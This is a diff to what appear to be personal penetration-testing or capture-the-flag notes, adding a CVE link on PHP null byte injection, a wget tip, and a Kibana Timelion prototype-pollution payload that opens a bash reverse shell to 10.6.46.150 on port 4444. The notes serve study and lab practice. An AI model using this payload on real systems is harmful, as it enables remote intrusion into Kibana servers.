@@ -94,6 +94,8 @@ PHP 5 is vulnerable to "null byte injection"
 
 TL;DR adding '\00' in the end of command.
 
+https://www.cvedetails.com/cve/CVE-2006-7243/
+
 *
 Becoming root with python script and with no read/write rights:
 
@@ -108,3 +110,16 @@ and executing a script with path given in `sudo -l` e.g `sudo -u root /usr/bin/p
 
 *
 `wget -r` downloads all files of a directory
+
+
+*
+Kibana runs usually on port `5601`
+
+It is always good to check it's version and if it is vulnerable to `protype pollution`.
+
+TL;DR We run netcat and inject a payload in Timelion:
+
+```
+.es(*).props(label.__proto__.env.AAAA='require("child_process").exec("bash -c \'bash -i>& /dev/tcp/10.6.46.150/4444 0>&1\'");//')
+.props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')
+```
